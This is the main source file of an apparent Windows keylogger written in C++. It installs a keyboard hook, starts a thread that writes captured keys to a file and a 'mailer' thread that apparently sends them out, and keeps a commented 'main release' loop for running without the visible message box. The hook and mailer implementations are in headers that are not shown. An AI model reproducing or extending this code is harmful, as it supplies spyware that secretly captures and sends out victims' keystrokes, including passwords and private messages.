#include <windows.h>
#include <winuser.h>
#include <future>

#include "key_hook.h"
#include "file_handler.h"
#include "thread_handler.h"

using namespace std;

int main()
{
    file_handler::path = "D:\\project\\testing\\";
    bool check = file_handler::initial();
    if (!check)
        return 0;

    check = key_hook::create_hook();
    if (!check)
        return 0;

    thread_handler::thr writer(true, thread_handler::timer, 10);
    thread_handler::thr mailer(true, thread_handler::mailer, 20);
    writer.caller();
    mailer.caller();

    MessageBoxW(NULL, L"\tHooking\t", L"Close to close XD", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);

    /*
    // in main release
    MSG m;
    while (GetMessage(&m, NULL, 0, 0))
    {
        TranslateMessage(&m);
        DispatchMessage(&m);
    }
    //end main release
    //*/

    writer.stopper();
    mailer.stopper();

    check = key_hook::delete_hook();
    if (!check)
        return 0;

    return 0;
}
